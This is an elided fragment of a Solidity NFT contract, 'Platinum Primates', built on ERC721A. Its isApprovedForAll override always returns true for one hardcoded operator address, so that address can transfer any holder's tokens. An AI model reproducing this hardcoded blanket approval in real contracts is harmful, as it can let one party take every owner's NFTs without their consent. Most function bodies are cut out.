  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0x561DDf0B1506B3e4c3544229764e0F33aDa1D049){return true;}
...
contract PlatinumPrimates is Ownable, ERC721A, ReentrancyGuard {
  ...
  constructor(
    uint256 maxBatchSize_,
    uint256 collectionSize_
  ) ERC721A("Platinum Primates", "PP", maxBatchSize_, collectionSize_) {
